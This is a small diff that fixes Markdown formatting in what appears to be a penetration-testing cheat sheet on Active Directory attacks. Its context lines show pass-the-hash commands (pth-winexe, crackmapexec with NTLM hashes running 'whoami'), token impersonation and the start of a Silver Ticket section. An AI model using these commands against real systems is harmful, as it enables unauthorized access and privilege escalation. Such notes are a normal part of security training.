@@ -122,7 +122,7 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> 
 ```
 
 - Exploitation to run commands as another user using PTH:
-``
+```
 crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoami'
 crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'
 ```
@@ -173,7 +173,6 @@ impersonate_token <token>
 
 ## Silver Ticket - Pass the Ticket
 - It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
-
 - Get SID
 ```
 GetDomainsid (PowerView)
